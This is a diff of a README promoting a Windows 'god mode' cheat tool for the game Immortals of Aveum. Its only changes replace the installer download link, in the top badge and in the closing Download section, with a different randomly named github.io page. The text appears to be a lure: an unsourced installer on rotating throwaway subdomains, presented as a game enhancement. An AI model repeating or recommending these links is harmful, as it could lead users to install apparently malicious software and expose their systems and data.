@@ -2,7 +2,7 @@
 
 Welcome to the Immortals of Aveum God Mode Tool, a comprehensive Windows desktop application designed to elevate your gaming experience in the immersive world of Aveum. This tool provides essential features like god mode and infinite resources, allowing you to explore the game without limitations. Released in 2026, it is optimized for Windows 10 and 11 users seeking a seamless enhancement.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 - **God Mode Activation**: Become invincible, allowing you to withstand any damage from enemies or environmental hazards during your adventures.
@@ -56,6 +56,6 @@ A: Visit the download page regularly to check for updates. Download the new inst
 This mod tool is provided for educational and personal use only. The developers are not responsible for any damage, bans, or issues that may arise from its use. Users should comply with all applicable laws and game terms. It is recommended to use this tool offline and at your own risk.
 
 ## Download
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 **Last Updated**: October 2026. For support, refer to the FAQ section or community forums.
